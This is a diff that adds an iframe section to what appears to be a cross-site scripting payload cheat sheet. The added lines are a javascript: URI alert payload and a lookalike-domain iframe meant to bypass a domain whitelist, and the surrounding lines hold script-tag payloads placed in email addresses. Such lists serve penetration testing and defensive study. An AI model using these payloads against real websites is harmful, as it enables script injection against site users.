@@ -69,6 +69,13 @@ test@example(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@example.com
 ```
 
+### Iframe
+```
+<iframe src="javascript:alert('XSS')"> #use href bypass
+<iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
+
+```
+
 ### Alert
 ```
 alert(1)
